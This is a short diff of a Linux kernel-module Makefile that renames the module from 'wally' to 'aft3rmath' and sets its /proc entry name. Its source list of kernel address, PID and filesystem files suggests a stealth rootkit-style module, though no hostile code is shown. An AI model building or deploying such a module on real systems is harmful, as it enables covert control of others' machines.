@@ -1,11 +1,11 @@
-OBJNAME=wally
+OBJNAME=aft3rmath
 BASESRC=src
 ARCH=arch/x86
 
 MOD_PROC_FILE=
 
 # PROCNAME, /proc/<name>, change this if you wish
-COMPILER_OPTIONS := -Werror -Wall -DPROCNAME='"wally"' -DMODNAME='"wally"'
+COMPILER_OPTIONS := -Werror -Wall -DPROCNAME='"aft3rmath"' -DMODNAME='"aft3rmath"'
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
 SRC := src/${OBJNAME}.c src/kernel_addr.c src/pid.c src/fs.c
